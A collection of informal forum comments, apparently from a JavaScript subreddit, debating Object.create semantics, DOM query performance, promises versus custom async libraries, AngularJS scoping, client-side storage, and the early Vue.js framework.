I don't mean to sound harsh, but unless I am completely misunderstanding the intention of the author this article is a little off base. Since Object.create is "new-ish" I want to dispel a couple things. First of all, all objects have a prototype. When you create an object this can be seen by inspecting the __proto__ property. By convention __propname__ is supposed to denote a private property (but there is no actual privacy). Objects with a constructor function (Function objects), furthermore, have a .prototype property as well. The main issue in the article is that doing var = {}, and Object.create(null) have different outcomes when you compare them with undefined because they are performing two completely different operations. They are definitely not creating a similar object (in as much as plain old js objects can be different since they are only collections of key value pairs (and ps this is what __proto__ is as well). Yes when we do var obj = {}; a __proto__ property is created (as with the creation of any object in js). However, this actually DOES happen when calling Object.create(null) as well. The point of Object.create is to take an object definition as it's argument and create an object whose prototype (__proto__) is the same as the object type passed in. Basically it is sugar for saying "take this object which is already defined, create a new empty object, and populate the new empty object with the already defined objects properties". To see this, try doing Object.create(String) in devtools, and inspect the properties. An empty plain old js object was created and the members of the String object's prototype have been attached to this new object (in js this makes it a String object, because this ALL objects are in javascript and I think that misunderstanding from classical patterns is coming into play here as well). So the main point: when I do Object.create(null) the environment is doing exactly what is being done with var obj = {} only it is replacing the new objects properties with the object that was passed in's prototype (since what is passed in is null, it is replaced with 'undefined' ;) ). That is the trick here. Note, also that if I do Object.create(null) == undefined, we will get true but if you use strict equality (Object.create(null) === undefined) you will get back false. Further more, even though the prototype has been overwritten by undefined in the call to Object.create(null), doing the !!Object.create(null) conversion to a boolean value with yield true! The object does exist and is thus 'truthy'. Finally, I am wondering what sort of use case would lead to a desire for an object to evaluate to equal with undefined anyway. That seems like some extenuating circumstance must have been at plan to be desirable. Hopefully, that at least more clearly lays out what is actually at play in the article. Strictly speaking, the statements in the article aren't incorrect but it definitely felt to me as if the full context of what Object.create is doing was not understood by the author. edit: Interestingly, in chrome his last snippet is true, but var obj = {}; obj == undefined is false....
You're not misunderstanding. What's being promoted here is pseudo global scoping, with all the inherent issues of global scoping. It's BAD.
Damn man, are you just bored?
I've been looking for an excuse to give React a shot so I figure I'll bring http://jsbin.com/ugetUvuY/1/ to life. At the very least you should be able to extract the time math code from it for a PDF version.
I messaged you
Somewhat related, but you should check out BNF for generating random sentences. 
If you right click and choose inspect element after you get infinite win.
I'm a little worried about your use of properties. They are intended to give back the same value unless the state of the object has been changed. So this standard test would fail: assert(true, casual.phone === casual.phone) Also, if you tried to JSON.stringify(casual) you'll end up with something unexpected. What is the benefit of not exposing the fast that the properties are functions?
If you dont't get my point, may be I'm wrong and you know all, or my experiment has something: i'm trying to reduce boilerplate of creating new functions and almoust failed. Async,wait have some syntax sugar benefits (use node functions directly to create promises, unify then,all etc) but without a compiler of some kind, I can't get rid of those wait or then stuff that are so annoing because tend to make a pyramid of calls by itslef. What wait/async shows is that a JavaScript future implementation could get rid of those functions without making the programmer aware of continuations or generators. That's a point, right? Be open and stop pretending that you know the only right way, please...
Just reversed the perspective...
&gt;Learning Javascript is hard... wut It's like the easiest language there is. 
May be is NIH, but actually I try to do something good for my projects and playing with these concepts. I tried to remove wait and then, reduce the call pyramids that happens with callbacks and promises and it is possible but not with current JavaScript. With some sort of conversion tools from a different syntax, wait/async code could be easier to generate compared with standard promises. I have a project swarmESB where probably I will go in the direction of switching from an internal JavaScript DSL to a proper DSL and this approach for promises could help.
I think when querySelectorAll() first came out to your latest browser, some queries like #id and .class were slower with it. I remember seeing those benchmarks as well. It seems like now querySelectorAll() is faster. I'm saying this as a middle of the road "jQuery is actually kind of *nice* because I don't have to think about IE" sort of deal.
Are you sure that the modifications aren't getting mixed up with previous modifications you've tried? When I insert the rules into the bottom of the stylesheet of the current version on the website, it appears correctly. I've also made the following modifications, so that the variation of image heights does not make the navigation area jump down and up. If the site owner wants the image to be full-sized, then let them know that the navigation needs to be on top so that it doesn't jump around when the main image is changed. #fsrep-images { height: auto !important; } #fsrep-main-image { width: 100% !important; height: 300px !important; } #fsrep-main-image img { width: auto !important!; height: 290px !important; } #fsrep-aimages { margin-left: 0 !important; width: auto !important; float: left; } .fsrep-aimage, .fsrep-aimage img { width: auto !important; } Edit: added a fix for spaces between previews.
next generation SEO spam tool?
Search for "global variables" on google, and you will find a ton of information about why they are considered bad. It applies to angular as it does to any other programming environment or language.
Thanks! Looks like we just needed to add one more float property, and to make sure that the main image is centered. I also think I included some redundant styling from my tests in the previous code. Here's the final style: #fsrep-main-image { width: 100% !important; height: 300px !important; padding-bottom: 10px; text-align: center; } #fsrep-main-image img { width: auto !important!; height: 100% !important; } #fsrep-aimages { margin-left: 0 !important; } #fsrep-aimages * { float: left; } The height under the main image is the height that you want all main images to be stretched to. 
Learn [CSS](http://www.w3schools.com/css/default.asp) I encourage you to read [eloquent javascript](http://eloquentjavascript.net/) , it will help you better understand javascript, it also has chapters ( 11 to 14 ) about how to use javascript to build web applications (interactive websites which talk with a web server using AJAX) Here is an [other resource](http://www.w3schools.com/js/js_htmldom.asp), I know that experts discourage reading W3schools *because they tell you the how, not the why* but i find it helpful, especially for beginners. The purpose of the two precedent resources is that you learn how to interact with the DOM (Document Object Model), and communicate with server using AJAX, jQuery is just one of the many libraries that make that work easier. I recommend that you understand what browsers offer before learning jQuery. If you like making games, I encourage you to learn little about the [canvas API](http://diveintohtml5.info/canvas.html), since it let you create HTML5 games easily. It is a joy!!!
My mistake before was using min-height. You have got it exactly. Thanks is not adequate for the help you have given me. I adjusted the resolution to 390 px and it looks perfect. 
Thanks can't wait to watch this! With a name like that being posted to a thread, I just assumed she would be showing cleavage, but then I was more excited when I saw some PowerPoint slides.
Q provides ways to use traditional callback methods (Node methods as you call them) to return promises so I dont see the win there. It also provides methods to deal with many promises (spread and all). And overall promises are composable and chainable and can be passed by reference to other parts of the application. The last part is where your library is causing problems - it's going to be exceedingly difficult to execute arbitrarily complex parallel and sequential execution paths using your methodology - I mean that suppose you have a group of things that you want to execute in parallel and link that with something sequential and then decide to execute something in parallel inside the group etc. Inside one flow of execution you might be be to pull it off but the definition would get more and more unwieldy as the complexity grew. In other words your APIs aren't composable but promises are. The more you make your API composable the closer you will get to just the naked promises API. 
Learn a server side language to become a much sought after "full stack developer"
I agree, Node.js would be a match.
I'd recommend the [MDN Javascript Guide](https://developer.mozilla.org/en-US/docs/DOM) over [W3Schools](http://www.w3fools.com).
BASIC is the easiest language there is. Now compare.
Definitely need to hop on the full stack train. Also, don't forget a liberal dose of REST, noSQL, SPA &amp; preprocess everything with multiple preprocessors to make sure your process is pre'd.
For all your services is going a little overboard. I've used it for a very limited number of things of which I do want to be available on a global scope. For 'all of your services', you start not knowing where what is being needed when, and you stop knowing the dependencies of your code. When changing 'X service', you don't really know what you could be affecting, since /everything/ could be using it if it's been pushed into your root scope. I stick my user context into root scope, and $state and $stateParams from ui-router, and that's about it. Everything there? not a good idea. But, I can see the use of a limited number of things there. 
Trying out Node.js to write server-side JavaScript might be fun. If you're looking to learn an entirely new language for backend development, you could pick up another scripting language (like Python or Ruby) or a compiled one (like Java or Scala). If you're not sure what to learn, Python is pretty straightforward and widely recommended (though not my favorite).
http://learn.code.org
This could be used as an alternative to broswerify (I think) how does it compare?
Thanks 
Thanks for the clarification I don't state to be an expert in JavaScript I just and come across Object.create recently and wanted to do a quick blog on it. 
Nice! Think you could port this to PHP?
This would be nice, if you have a specific target audience for example. If not, it should at least force the use of i8n by including funny characters in different fields.
Apart from all the Bad Parts and Awful Parts, land mines that can easily throw you off track. Like == vs ===. http://www.maztek.com/blog/wp-content/uploads/javascript.jpg
This might be of value to you: https://github.com/sahat/hackathon-starter
Thank you, definitely checking that out. Looks interesting.
This sounds close: http://hoverbattles.com/game.html / https://github.com/robashton/HoverBattles
This is a poor test. Your walking-the-dom code already knows the solution, because it simply jumps to the second result when looking at `p` tags. So, yeah, if you know the node you want, jumping straight to it will be faster. To be a fair test, it should be checking branch of each result of each lookup until it doesn't find a match, then backtracking until it either finds a complete match, or no match. It's also, at best, a very tiny micro-perf test, and doesn't cover a wide range of selections.
In some ways I wish js had never used the term Object to describe it's objects. It causes so much confusion because people are so ingrained with knowledge from class based OOP. For example, even some of the more professional documents out there will say that Object.create will create an "instace" of an object you pass into it. This isn't really true in the classical sense of what an instance is. If you have an object that houses another reference type (like other objects and arrays) every instance you create of that object with Object.create will share the reference to that array the original object houses for exact reason I mentioned before. So changing the array in instance a with change the array in instance b as well. I adore javascript but I think the similarity in syntax to languages like java confuses people into trying to use them in the same manner though they are completely different paradigms. Is getting better every year though! 
I have been developing a sort of CRUD web app which sends data exclusively over websockets(socket.io) and I can't understand why people would use cookies at all. Cookies are a tool for typical web apps, for single page applications that hold uninterrupted connection to the server, they are just getting in the way. I am not saying it is the best project to be learning from-I haven't developed it as a showcase, but you can check out my Zakonomat: https://github.com/capaj/zakonomat Zakonomat is just voting system for Github gists. It uses Moonridge- another project of mine. Moonridge is quite thin layer over the Moongoose and socket.io. If you have any questions, send me a message, I will definately provide an answer.
Too bad that it is a little bit old, but yeah Rob Ashton is brilliant developer. Nowadays, NPM has many modules, that would make the HoverBattles a little bit easier to write.
I mean using cookies to store the user session. Anyways, I'll check your project out too. Thank you
I dont know what kind of apps you create. If you care about paralel, serial execution of complex logic,etc probably with flow control libraries you get more control. Usually, these days i deal with unpromsified apis to create simple APIs that I compose in a ESB system and not directly by calling each other in big balls of mud.. So.. I don't care about such complex cases where execution flow shoud be optimising. Also,I see what is lost, 'wait' is just unifying 'then' and 'all' but doesn't return a promise. It could return a promise but I still have to see cases where this is just not making code harder to analyse. My instict is that the code will be more obfuscated and harder to undestand by somebody else. Giving names to things is forcing a clear code. Chaining some dubious abstractions a lot seems code smell to me.JS is allready so untyped,but having lot of chains that return some temporary types without any explicit contract visible doesn't look like a nice thing to do to your colegues that will fix bugs in your code. I could be wrong but also you missed entirely other point, I will expain again. It is possible to imagine a language where you dont have to use wait,then,all but the interprteer creates those pesky functions used with then,wait. These invisible functions could share the same variable scope and promises become almoust invisible. That is the real problem with then syntax, blinds you to see a better altenative.
The browser typically sets up a hashmap with all of the elements that have IDs. When you use the getElementById function you're accessing this hashmap directly, which is O(1) search time. Then digging into the resulting nodes is fairly easy, especially if the browser doesn't have to do a bunch of loops to assemble the &lt;p&gt; tags, etc. into a large array. When you use querySelector the browser has to parse the text into its corresponding groups. Then it will set up a loop to handle each query individually. It then has to identify which type of method to use, either a getElementById style or getElementByClassname, or getElementByTagname. You're probably loosing speed on the string manipulation of the query, and the identification of the correct method. I've made a version that shows how walking the DOM would be more parallel to the querySelector results. http://jsperf.com/queryselect-vs-walkingdom/2
Don't forget your databases! SQL and NoSQL. If you use node.js like everyone's suggesting, learn MongoDB for data storage, and Redis for caching. Also, before you do any of that, learn to use *nix systems. Take look at both RHEL (Fedora, CentOS) and Debian (Ubuntu) and get a feel for both. Then decide one to master.
Yeah this isn't really proving much - absolutely no overhead of the CSS selector parser and processor coming into play for the second test item - just working over pure DOM objects and references. And as others have stated, you know exactly where to look for your target element.
&gt; To be a fair test, it should be checking branch of each result of each lookup until it doesn't find a match, then backtracking until it either finds a complete match, or no match. That is not how modern browsers walk the DOM and the test is entirely valid as written. To be fair though, I rewrote the test to illustrate your point and the results are even more extreme: http://jsperf.com/queryselect-vs-walkingdom/3 
Do you regularly write single DOM queries containing more than 4 steps per query? What would make for a more valid test case?
No need for a flow control library. Promises compose the flow naturally and optimally. *Your* library is a flow control library which is why I don't think it's a good idea. I don't think I'm the one who is blind. I get what your library does. You don't seem to get why I think native promises are better than your library or any other flow control library. Incidentally there already are flow control libraries that try to do what your library does in a more elegant manner with many more features. If you prefer that manner of flow control then I suggest you check out async instead of rolling our own. It doesn't muck with function prototype but then again that seems like a bad idea to begin with IMO. 
Your code doesn't match the querySelector at all. Mine may not have been fully optimized in certain areas but it at least did what the querySelector did. I've modified your version once more to match the querySelector and added comments. http://jsperf.com/queryselect-vs-walkingdom/4
You might want to look at some of the [examples from http-framework](https://github.com/Raynos/http-framework/tree/master/examples) which show how to accomplish various tasks using small, focused modules.
&gt; Promises don't really get rid by piramid calls. ...the entire point of promises is that they do, in fact, get rid of pyramid calls. The convert code like this: getUserFromEmail(email, function(user){ getPostsForUser(user, function(posts){ getCommentsForPost(posts[0], function(comments){ getUserFromComment(comment[0], function(user){ $('#commentAuthor').text(user.name); }); }); }); }); Into code like this: Promise.try() .then(function() {return getUserFromEmail(email)}) .then(function(user) {return getPostsForUser(user)}) .then(function(posts) {return getCommentsForPost(posts[0])}) .then(function(comments) {return getUserFromComment(comments[0])}) .then(function(user) {$('#commentAuthor').text(user.name)}); That's what people mean when they talk about flattening the callback pyramid. I'm struggling to see a way in which your claim is actually true. &gt; Usually new promises should be created in then callbacks because you really need actual values(or computed values from satisfied promises values) and not promises.For me is the most common case... Well, yes. The idea of the callback pyramid is that you are making sequential, dependent, async calls. Each layer of the pyramid translates into a .then() block returning a new promise. That's the point. And then, eventually, you don't have any more async calls to make, and you have the real value, which you use. &gt; and the callback piramid is just there with better syntax and better error handling. ...unless you mean that the pyramid is still "there" in the sense that it isn't actually there at all because it's been hidden by the better syntax, then no, this is not true. In particular: One of the main points of Promises is that they remove the layers of the "callback pyramid" which are caused by the need to chain sequential, dependent, async calls. And it's trivial to show that they do, in fact, do this. &gt; The problem with icedCofffeScript is that is not javascript:) It is hard to hire programmers that want to learn unproved languages plus the speed of the teem will be bad for a while with something new.. True. (Well, one might argue that coffeescript is hardly unproven, and ICS is a very minor variant.) But okay. A good reason to stick with widely adopted technologies like Promises, or just vanilla callbacks then, I guess? Or other, existing flow control libraries like async.js? You really seem to struggle to articulate the flaws in existing solutions, or the advantages of yours. The issues with the callback pyramid are widely accepted; the flaws you apparently see in all the existing solutions are not. If you could show a block of code written with Promises (or async.js, or generators, or one of the existing preprocessors that adds wait/defer keywords) and list its failings, and then show how your library removes some of those failings, you would get a much more supportive hearing. Instead, you show example code that looks...just like all the other solutions. But it's much easier to hire a coder who has used async.js or Promises than it is to hire one who has used asynchron. :)
em, actually it was inspired by https://github.com/fzaninotto/Faker :)
got an example pipe you can share?
&gt; I am running this through the console, so I can't necessarily use jQuery Why can't you use jQuery if its loaded on the page?
I guess I could if I imported it! Like I said, I'm new to JS and I'm not sure how to do that!
I know jack about js but does the ++i in the for loop need to be i++?
if you already include the javascript, you have access to it in the console. just type `$`.
Here's why it's not working I think: Your query selector and your getElementsByClassName are using the same string. They are, however, doing different things: getElementsByClassName will look for a singular element with all those classes, which is what you want. querySelectorAll on the other hand with that string will attempt to find all elements with the tag name (not the class name) btn-primary who are indirect children of elements with the tag name btn, and so forth and so forth. Tldr: you're using two different methods to look up your elements which are doing totally different things. Look up both methods on something like the Mozilla Developers Network and you'll understand why :-) (Also for the record neither of those methods are lightweight, it's really a good idea to do it once and store it in a variable :-))
by "other" I actually meant to type "author" :-D
Have you looked at [Meteor](https://www.meteor.com/)
The `angular-fullstack` yeoman generator creates a boilerplate MEAN stack application, using MongoDB, Express, AngularJS, and Node. Features: * Express server integrated with grunt tasks * Livereload of client and server files * Support for Jade and CoffeeScript * Easy deployment workflow. * Optional MongoDB integration * Optional Passport integration for adding user accounts https://github.com/DaftMonk/generator-angular-fullstack This is the example app which is created by answering yes to all the yeoman questions: http://fullstack-demo.herokuapp.com/
One way to learn is to study the commit logs. Projects that have the privilege of being developed in the open on github and have all sorts of detailed commit logs will help you see how the project gets developed incrementally.
Ah, ahem, excellent, I'll star both just for good measure
I want to download the Option pages, a whole page at a time. eg: http://finance.yahoo.com/q/op?s=PG&amp;m=2014-02. I just want the entire raw html in a string. I can parse it myself. In perl I just say $string=get $url. With jQuery I was trying: $.get( "http://query.yahooapis.com/v1/public/yql?q=select%20*%20from%20html%20where%20url%3D%22http%3A%2F%2Ffinance.yahoo.com%2Fq%2Fop%3Fs%3DPG%22&amp;format=text&amp;diagnostics=true".
Very few single-page apps have an "uninterrupted connection", though, so cookies can be useful. To OP: I will say, however, that as long as you only have to support browsers that support the APIs, a better (than cookies) choice is localStorage/sessionStorage (depending on how you want the "cookie" data to persist), or even IndexedDB for apps needing to store large amounts of structured data, and you can always fallback gracefully to cookies for older browsers (probably not a good idea if you require something as robust as IndexedDB, just to be clear).
localStorage is supported on anything newer than IE8, it is high time everyone used it for caching instead of cookies, unless they really need to have the data accesible on the server for each request.
You need to pass a callback function to $.get. An example would be $.get("http://query.yahooapis.com/v1/public/yql?q=select%20*%20from%20html%20where%20url%3D%22http%3A%2F%2Ffinance.yahoo.com%2Fq%2Fop%3Fs%3DPG%22&amp;format=text&amp;diagnostics=true",function(response) { //do something with response console.log(response); });
just a quick thought, as I'm too lazy to actually verify it: I think getAttribute should return a String, and not a Number, so the === will not work. feel free to correct me.
I'm glad I was at work when I clicked this link. Not that I don't NEED these, I just wasn't expecting to do it so quickly!
I can also recommend you https://github.com/mgonto/meaner-seed A MEAN project (Mongo, Angular, Express, NodeJS) to start with. It has basic examples on how to start with it.
$scope.$watch - we can use it by expression, or by function.
no
Please use stack overflow for questions about code.
No, sorry, you don't understand my point, you are just saying the same things over and over again, so I will stop it... Thank you for your feedback!
Thanks. That works, after I serialized the response.
http://taskjs.org with regenerator should do the trick. 
Neat. It's probably a good idea to add a reference implementation to [todomvc.com](http://todomvc.com/). It'll definitely help Vue get visibility.
It's not what OP asked for. Also, W3Fools.
Its a shame that $watch is not used more, I always fear the performance implications added by using watches. 
You get that, except you just need to put the yield keyword in front of any function that is asynchronous. This is nice because it doesn't invert your control flow and it's very easy to move sync code to async code. Requiring this keyword is a good thing since it makes every codepath that does I/O very clear. Since I/O is very slow and should be parallelized as much as possible, the yield keyword serves as a marker to help guide you.
No, for caching stuff between visits, please use localStorage. Unless you are using them for sessions. Cookies create unneeded overhead on every request that client sends to your server.
I might come off as a bit "high and mighty" now, but.... If you learn SQL (which you should, it's a language that should be in every programmers toolbelt) _please_ make sure that you actually learn the language and not just learn the minimal basics and then move on. Learn about indexes, clustering, primary/foreign keys, constraints, when to use normalization and when to not, the different type of joins and how to use them properly, transactions, triggers, stored procedures and so on. Please do not just learn the basic SELECT/INSERT/DELETE/UPDATE statements and then start using [random] ORM and go on your merry way. Using ORM's seems to be all the hype right now, but I find that in order to use them to the max you really need to know what the h*ll they are doing on a database level so you can perform the correct actions when your application starts behaving slowly. I've been in so many projects where the main problem has turned out to be that someone "just hacked together" the database model and the layer that handled communication with it without any consideration at all to data integrity, performance, and so on. You'd be surprised how many programmers that can't even use proper joins but instead insists on doing a million database queries without joins instead of a single one with joins. Refactoring the database layer of a medium sized application can be a true horror... Please learn SQL and databases properly if you intend to use databases! (Unless you have a dedicated DBA in your team that can review all database-related code, but even then - please be considerate of your friendly DBA's!) :)
Doing this purely using client side Javascript will not work for most websites, as most so not allow resource sharing across different domains. Lookup CORS. Instead you will need to write a "scrape" server. You can use Javascript for this, if this is your objective, using NodeJs. Otherwise, you can use any language you like.
is this a reinvented [knockout.js](http://knockoutjs.com/)?
I'd be interested in this as well. Seems a lot easier to understand than some of the larger frameworks.
If an element does not contain the next element specified in the query then why would you loop through it and its children? You don't. Instead you need to go to the parent's next sibling and continue to search. You do not need to loop through each and every ancestor node unless you were doing a comparison with querySelectorAll, because querySelector breaks after finding the first node matching is selector.
As a Angular Developer, one of the major differences is the size of the framework and available API's. It seems like a key choice for project where you can pick and choose whats available (router, promises, type of testing). 
The next next version (ES7) will likely contain something like this: var getData = async function(){ var list = await getListWithAjax(); var data = await getEntryWithAjax(list[0]); var user = await getUseInfo(data.username); return {data, user}; } This is exactly the way taskjs does it, just with native sugar instead of a library.
It kind of looks like AngularJS, but with better classes. I like it. I'm gonna be watching it closely. Edit: I just found out that the guy that made it, also works at Google. http://twitter.com/youyuxi Edit2: I just realised OP is the guy that made it. Hi OP! Really cool.
This is like microsft's async,await... Await is just sugar for creating a continuation,right? Stop the execution of current function until that asynchronous function returns rigt? I'm talking about a different beast, one that simulates callbacks as execution, don't stop the execution of current function... It is something new as proposal... try to understand my example a bit.. 
w3schools fell out of favor years ago. The preferred resource is the mozilla developer network.
See this new post: http://www.reddit.com/r/javascript/comments/1wvp7k/proposal_for_the_next_javascript_version_standard/ Promises and asynchronous code are complex topic and people see only what they already know. The point is not that asynchron is much better, I agree that is the same with promises but could open a better way if you look with an open mind. The new stuff with generators, continuation and so on. are more complex than it could be, that's why I'm fighting for this new idea.
The first one allows you to create an event handler even if the element doesn't exist yet. It listens to all document events and triggers your callback when event target matches your selector. http://api.jquery.com/on/ The second one tries to bind an event handler to specific element/elements. It fails gracefully even if elements are not created yet. Easy way to figure out if your selector matches any elements is to use console.log($('selector').length) . $(selector).length returns 0 if the selector doesn't match any elements. 
Another thing that you might want to consider is that for the examples you mentioned, twitter and reddit, do not actually need to be scraped. Both expose a public API, and it will (probably) be easier just to consume those instead of writing scrape code, which is fragile because it is only going to work for a long as the targets site does not modify the tendered markup of you target pages. 
Imho, Samsung Smart TV is best of them all. Philips Net TV is on the top of my horror list.
That article was clearly not written by a JavaScript developer.
I submitted the same source code 5 times before it got accepted. . . I've heard they have changed it since, I imagine that they are all pretty bad to work with.
They downvote because you don't give any explanation or whatsoever on why your approach would be any better than the existing one.
Yep, I use to use it all the time, but then one of the commercials they aired while I had the "kid friendly videos" sub on was of war/killing/etc, my kid was not age appropriate for the commercial. I was done with it. Edit: My problem was with reddit.tv **not** the post here, please try http://dailyblocks.com
I'd seen a Stackoverflow entry on how to use jQuery to access a WS endpoint http://stackoverflow.com/questions/12796941/how-to-call-soap-ws-from-javascript-jquery - it would work in this particular instance as the endpoint would be fixed as would the interface, so you'd have to short-cut the WSDL generation and hack up your service calls. And that's not an engineered solution.
Yep, that's possible and gives smaller overhead - but only if you don't want to use `require(...)` in runtime for bundled modules nor use external [Node.js] modules in runtime but use CommonJS for structuring your code and all the require(...) calls are internal inside your package. For example, you may want to have look at this pull request to React.js: https://github.com/facebook/react/pull/1002
Ah, I didn't realize the Gephi plugin hasn't been updated. Ok cool I'll try out these suggestions. Thank you so much!
There is one currently on the site: http://vuejs.org/examples/todomvc.html Will definitely send a PR to official todomvc later.
What does the touches[x] do exactly? What does it fetch?
This jsperf is a wonderful short example of what is wrong with most DOM benchmarks. Both are so fast that there is no practical difference between the two. That means it's almost impossible for these particular operations to be the ones causing a performance issue, and therefore not the things you should be looking at to speed up a page. 
additional info can be found [here](http://bitovi.com/blog/2010/10/a-crash-course-in-how-dom-events-work.html) DOM events bubble up and are captured down an even [better example](http://javascript.info/tutorial/bubbling-and-capturing)
I'm propose an alternative that has minimal syntactic and semantic differences compared with synchronous code. The existing alternative is having the await keyword at each call but that will create an continuation and from what I understand it will stop the execution. I'm not an expert about how await will be implemented but I don't see the need for await and for a new type of functions when a more minimal alternative exist. We want JS to be a job safe language or one in which to are productive? It is job safe enough as it is :) I hope that we will want to be productive and a good language with simpler possible constructs is the way to go.
It's a list of the object touched, you need to use it to access variable of the event relative to the touch, instead of accessing them from "event".
I really like it, especially the choice to support only IE9 and above to use nice ECMA5 features like custom get and set methods.
`await` is based on `yield`, which is already [standardized](https://people.mozilla.org/~jorendorff/es6-draft.html#sec-generator-function-definitions) and [implemented](http://kangax.github.io/es5-compat-table/es6/#Generators_%28yield%29). It works, and is well understood by the language designers, implementers and programmers (it is pretty straight forward), so there is no reason to move away from it. You say that you "don't see the need for ... a new type of function", but what would happen if your `getTemplate` function doesn't return a promise? How is exceptions handled inside it? Can you nest several of these functions inside each other? All these edge cases need to work in a solution, and they have all been thought through and decided on by the TC39 committee. The * in `function *(){}` is there for a [good reason](http://esdiscuss.org/topic/function-is-not-mandatory#content-1 ). What you have is a good suggestion for a new language feature, but there is already one which is slightly better. Get to know it, learn how to use it and prepare for the future. If you are interested in new features in JavaScript and you want to influence the next version, I suggest you sign up for the [mailing list](https://mail.mozilla.org/listinfo/es-discuss).
One the reasons I tried out knockout before Angular (if you wanna circlejerk go ahead) was because of knockout's clear and fundamental concept of VM. I believe MVC is a good foundation, but all foundations need updates. I think MVVM is a much better approach when you explain the situation. In my Angular stuff, I kind leverage the VM pattern a bit more also. Maybe looser than the way google says what their Angular MVC pattern should be. Again, this is where I think the MVC vs. MVVM patterns "grey" area are.
Anyone actually used this and can contrast it with Knockout?
jQuery and Underscore's implementations differ in functionality a tiny bit. Underscore returns `true` for `NaN` and `Infinity`, whereas jQuery returns `false`. Additionally, jQuery returns `true` for strings that look like numbers, whereas Underscore returns `false`. This makes sense, is you imagine that "numeric" means "has the properties of/looks like a number". `isNumber` literally checks if a value is a number; `isNumeric` will let things pass that look enough like numbers, and reject things like `NaN` that aren't useful in calculations. Which implementation you use will depend on which types of numbers you're looking for. `isNumber` could alternatively be written like: function isNumber(obj) { return typeof obj === 'number' || obj instanceof Number; } and `isNumeric` like: function isNumeric(obj) { return isFinite(obj) &amp;&amp; !isNaN(parseFloat(obj)); } Something I learned while researching this is that in much the same way strings can be type-coerced into numbers, so can single-item arrays. +"23" // -&gt; 23 +[23] // -&gt; 23 More bizarrely: +["23"] // -&gt; 23 +[[23]] // -&gt; 23 +[[[[[23]]]]]] // -&gt; 23 +[[[2]]+[[3]]] // -&gt; 23 so `$.isNumeric` returns true for all of these as well, while `_.isNumber` clearly won't. **EDIT:** Above, I wrote out an alternative for `_.isNumber`. [According to jsPerf](http://jsperf.com/isnumber-tostring-vs-instanceof), it's faster by a factor of 10. I ran a test suite in Jasmine to confirm that it is functionally equivalent to Underscore's method (which includes checking all the conceivable primitive types, as well as `NaN`, `Infinity`, number strings, objects created with `Number`, objects created with `new Number`, and even numbers created in different frames (this type of thing [has been known to fail](http://perfectionkills.com/instanceof-considered-harmful-or-how-to-write-a-robust-isarray/) when checking `instanceof` on arrays). Can anyone think of a case where using `typeof obj === 'number' || obj instanceof Number;` would be slower than the method currently used in Underscore, or would produce a different output?
The for loop already checks the count. If the element doesn't contain the other element then the length of the array is 0 and the for loop doesn't start. You can't just skip the next element because your query is thus: \#qsSample - Select the element by ID qsSample p - Select all &lt;p&gt; children of qsSample (and any element below), not just the first, all. em - Select all &lt;em&gt; children of each p child (and any element below), not just the first, all. a - Select all &lt;a&gt; children of each em child (and any element below). Again, all. You can't modify the for loops to be different than the querySelector, which is what you're trying to do by forcing it to stop at the first element found. &gt; because querySelector breaks after finding the first node matching is selector. No it doesn't. Your querySelector uses child selectors. If you wanted it to break then you would need it to be like this: "#qsSample&gt;p&gt;em:first-child&gt;a:first-child"
Further searches uncovered this: http://cxf.apache.org/docs/wsdl-to-javascript.html
Linkspam. Move along.
Wether we add an await keyword or your proposed async keywoard does not really matter. Imho the await is easier to read, as we tend to read from left to right. await expression - I am waiting for the result of the following expression. The stop in execution is something good, as you don't have the additional layer of callbacks. Given the dynamic nature of javascript objects it is also a lot easier to handle.
await can be before, not really a problem there, but pausing the execution doesn't reduce the parallelism? I want to execute as more independent things as possible as soon as possible and pausing the execution is basically serializing the execution.. I miss something? 
You broke my back button :(
You can use `Promise.race` or `Promise.all` to do things in parallel. For example: var allAreLoaded = await Promise.all([ajax(1), ajax(2), ajax(3)]);
Oh cool. Thank you very much. I'll give it a try and let you know if it goes sour.
Thanks. I'll give this a shot when I get home!
This works great. I added .show("slow") and it eases it in from the side. Took me a minute to look up the difference between .mouseover and .hover. Might be out of this subs realm or my abilities but how would I go about displaying content in the empty white space before the expanding triggers? Example. Before it expands theres a nice chunk of realestate under the heading banner. I could populate this with some social icons and when the user triggers the .show() the social icons would disappear and the div would expand. Nevermind! Figured it out (extremely simple just had to wake up =-) What do you think? Not set on anything yet but I think its headed in the right direction. http://www.clemson4wheel.com/cmstest#
This does look really sexy, only real downside for me is the browser support. It looks like a much less-opinionated form of Angular, since it provides many of the same facilities but doesn't require near as much boilerplate. Will probably be easier to integrate this into an existing project, whereas NG requires that your app kind adhere to its paradigms.
Ok, but why not doing: var r1 = asyncron ajax(1) var r2 = asyncron ajax(2) var r3 = asyncron ajax(3) var allAreLoaded = succes(r1,r2,r3) var anyFailure = fail(r1,r2,r3) is just syntax sugar but I can try, right :)? With proposed approach you don't have to deal with promises's APIs at all. 
In the end I think that such decision should take not out preferences but taking in consideration the kind of people that will use the stuff.. It will be funny to learn some juniors about promises, generators and continuations,etc..
I'd write a proxy to handle XML/SOAP to JSON. Then choose a JS framework
Thanks ;) Just want to clarify that although I do work for Google, this is largely a personal project used mostly in prototypes at the moment.
The website is built with hexo and the source code is here: https://github.com/vuejs/vuejs.org
Hey Evan, thanks a lot for replying. Im about to release a website of an open source project, and I dont want to waste too much time on designing the website. You website look gorgeous, I love the readability and the structure. Will it be a problem for you if I use the same html/css/js? I will give you full credit, and make changes so it cannot be confused between both. Thanks a lot.
I would recommend you this [Eloquent JS](http://eloquentjavascript.net/) or just go through mozilla tutorials.
If you are starting fresh go to [codecademy.com](http://www.codecademy.com/) They let you do the tutorials 
is `success()` the same as `Promise.all.done()`? And `fail()` the same as `Promise.all.done(null, ...)`? Or do you mean that it would naturally be parallel when you run `asyncron`? How would you then get things to run serially?
yes, it will be naturally parallel with asynchron. To do them serially you have to create some dependencies, artificial dependencies if you really want . But usually you want to execute in parallel as fast as is possible, isn't it? Yes, I agree that serial will be uglier,quite nice :))
By artificial dependency I mean something like: var r1 = asyncron ajax(1) if(true(r1)){ //sadic joke ;) but if r1 can be null, we need a function that returns always true but will not be called until r1 is done var r2 = asyncron ajax(2) }
Will this include TiVo apps? I've been thinking about making one but I can't find much info.
Looks promising - I'm a big fan of Angular and can see the influences here. Seems like it has a slightly more narrow/targeted focus than Angular which can have it's pro's/con's depending on the needed use.
There are a few NodeJS plugins that can help out such as [xml2js](https://github.com/Leonidas-from-XIV/node-xml2js). I've only had success working with simple XML mind you, I don't know if they would be able to handle WSDL and complex XML
I've done something similar to this https://github.com/leonidas/gulp-project-template 
